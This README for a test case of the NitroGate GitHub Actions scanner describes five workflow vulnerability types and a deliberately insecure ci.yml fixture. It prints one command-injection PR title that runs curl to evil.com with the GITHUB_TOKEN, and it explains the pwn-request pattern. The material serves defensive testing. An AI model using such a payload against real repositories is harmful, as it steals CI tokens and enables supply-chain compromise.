# Example 03: GitHub Actions Workflow Security

## What This Tests

NitroGate's workflow scanner detects five categories of GitHub Actions security issues:

| Check | Risk | CVSS-equivalent |
|---|---|---|
| **Script Injection** | Attacker-controlled PR title/body injected into `run:` steps | Critical |
| **Pwn Request** | `pull_request_target` + `actions/checkout` of PR head = code exec | Critical |
| **Unpinned Actions** | Using `@main` or `@v1` instead of SHA pins = supply chain risk | Medium |
| **Excessive Permissions** | `permissions: write-all` grants unnecessary access | Medium |
| **Secret Logging** | `echo ${{ secrets.X }}` leaks secrets to workflow logs | High |

## Test Data

`ci.yml` is a deliberately insecure GitHub Actions workflow containing all five vulnerability types.

## How to Run

```bash
cd /path/to/nitrogate
go test ./internal/scanner/ -run TestWorkflowScanner -v
```

## Expected Output

The scanner should flag:

| Finding | Severity | Line |
|---|---|---|
| Script Injection in `run:` step | **CRITICAL** | Uses `${{ github.event.pull_request.title }}` in a `run:` block |
| Pwn Request pattern | **CRITICAL** | `pull_request_target` trigger + `actions/checkout` with PR ref |
| Unpinned action: `some-org/action@main` | **MEDIUM** | Not pinned to a SHA hash |
| Excessive permissions | **MEDIUM** | Top-level `permissions: write-all` |

## The Real-World Problem

**Script Injection** (most critical): If a workflow does:
```yaml
run: echo "PR title: ${{ github.event.pull_request.title }}"
```
An attacker can set their PR title to:
```
"; curl https://evil.com/steal?token=$GITHUB_TOKEN; echo "
```
This executes arbitrary commands with the workflow's permissions.

**Pwn Request**: `pull_request_target` runs with write access to the base repo. If it checks out the PR head code and runs it, an attacker's forked PR can execute arbitrary code with write access to the target repo.

NitroGate catches both patterns automatically.
